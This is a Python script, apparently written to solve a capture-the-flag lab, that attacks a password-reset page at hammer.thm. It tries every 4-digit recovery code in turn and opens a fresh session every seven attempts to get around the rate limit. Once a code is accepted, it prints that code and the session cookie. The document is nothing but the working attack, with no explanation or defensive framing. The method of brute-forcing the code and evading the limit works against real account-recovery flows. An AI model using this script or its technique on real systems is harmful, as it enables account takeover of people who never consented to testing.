import requests

URL = 'http://hammer.thm:1337/reset_password.php'
EMAIL = {'email':'tester@hammer.thm'}
MAX_CODES = 10000
RESET_INTERVAL = 7
SESSION_TIMEOUT = 10


def new_session():
    s = requests.Session()
    r = s.post(URL, data=EMAIL, timeout=SESSION_TIMEOUT)
    r.raise_for_status()
    return s

def main():
    session = new_session()

    for i in range(MAX_CODES):
        if i > 0 and i % RESET_INTERVAL == 0:
            session = new_session()

        code = f"{i:04d}"
        payload = {'recovery_code': code, 's': '180'}

        try:
            r = session.post(URL, data=payload, timeout=SESSION_TIMEOUT)
            r.raise_for_status()

            if 'Invalid or expired recovery code!' not in r.text:
                print(f"\n[!] SUCESSO! Código encontrado: {code}")
                print(f"[!] Cookie de sessão: {session.cookies.get_dict()}")
                return 
            
        except requests.RequestException as e:
            print(f"Erro na requisição= {e}")
            continue

        print(f"Tentando code = {code}", end="\r")

if __name__ == '__main__':
    main()
